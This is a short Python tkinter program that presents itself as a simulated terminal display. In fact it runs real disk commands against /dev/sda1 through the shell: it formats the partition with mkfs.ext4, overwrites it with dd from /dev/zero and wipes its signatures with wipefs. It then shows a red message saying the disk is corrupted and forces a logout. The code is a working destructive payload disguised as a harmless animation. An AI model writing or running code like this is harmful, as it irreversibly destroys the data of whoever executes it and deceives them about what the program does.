import tkinter as tk
import subprocess
import threading
import time

user = "sahib"
host = "linux"

commands = [
    "lsblk",
    "df -h",
    "mount",
    "umount /dev/sda1",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda1 bs=1M count=100",
    "wipefs -a /dev/sda1",
    "fdisk -l"
]

def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        return e.output

def simulate_terminal(text_widget, root):
    start_time = time.time()
    for cmd in commands:
        prompt = f"{user}@{host}:~$ "
        for c in prompt + cmd:
            text_widget.insert(tk.END, c)
            text_widget.see(tk.END)
            root.update()
            time.sleep(0.03)
        text_widget.insert(tk.END, "\n")
        output = run_command(cmd)
        text_widget.insert(tk.END, output + "\n")
        text_widget.see(tk.END)
        time.sleep(0.6)
        
    final_msg = "\n[!] WARNING: Disk /dev/sda1 Has Been Corrupted.. Recovery Not Possible.\n"
    text_widget.insert(tk.END, final_msg, "end")
    text_widget.see(tk.END)

    time.sleep(2)

    run_command("gnome-session-quit --logout --no-prompt")


def start_terminal():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    root.bind("<Escape>", lambda e: root.destroy())

    text = tk.Text(root, bg="black", fg="red", font=("Consolas", 14), borderwidth=0)
    text.pack(expand=True, fill="both")
    text.config(cursor="none")
    text.tag_config("end", foreground="red", font=("Consolas", 18))

    threading.Thread(target=simulate_terminal, args=(text, root), daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    start_terminal()
